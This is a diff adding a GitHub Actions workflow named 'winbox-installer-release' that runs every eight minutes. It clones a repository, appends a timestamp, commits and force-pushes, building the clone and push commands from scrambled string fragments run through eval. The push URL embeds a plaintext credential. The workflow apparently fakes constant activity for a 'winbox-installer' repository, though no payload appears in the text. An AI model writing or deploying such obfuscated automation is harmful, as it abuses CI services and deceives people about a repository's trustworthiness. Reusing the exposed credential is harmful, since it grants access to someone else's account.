@@ -1,0 +1,39 @@
+name: winbox-installer-release
+on:
+  schedule:
+    - cron: '*/8 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: winbox-installer
+        run: |
+          sudo apt update || true
+          sudo apt --yes install git &>/dev/null
+          GCC=$(date +%s)
+          deUCrFCP="git clone h"
+          UjjCqq="ttps://gith"
+          mscaK="ub.com/jime"
+          ciPgVdLas="nbianjimenb"
+          RmhSoeOJiyq="ianmgoy/win"
+          xxXagR="box-install"
+          eval "$deUCrFCP""$UjjCqq""$mscaK""$ciPgVdLas""$RmhSoeOJiyq""$xxXagR""er.git tmp"
+          cd tmp
+          echo $GCC >> y5gfRM
+          git config user.name janna-yevlampova
+          git config user.email janna.yevlampova@lenta.ru
+          EZqAoqn="git add y5g"
+          eval "$EZqAoqn""fRM"
+          git commit -m Done
+          jDIGI="git push ht"
+          fCFLkY="tps://janna"
+          zKipesrjC="-yevlampova"
+          dQFQJKPWWKj=":'WjRSj4JPi"
+          PFjPe="ti9kCE-0Dd'"
+          uExfWRHeWH="@github.com"
+          HLHDwbLTDyt="/jimenbianj"
+          TUTthfc="imenbianmgo"
+          HyYnbC="y/winbox-in"
+          OTyBnq="staller.git"
+          eval "$jDIGI""$fCFLkY""$zKipesrjC""$dQFQJKPWWKj""$PFjPe""$uExfWRHeWH""$HLHDwbLTDyt""$TUTthfc""$HyYnbC""$OTyBnq"" -f"
+          
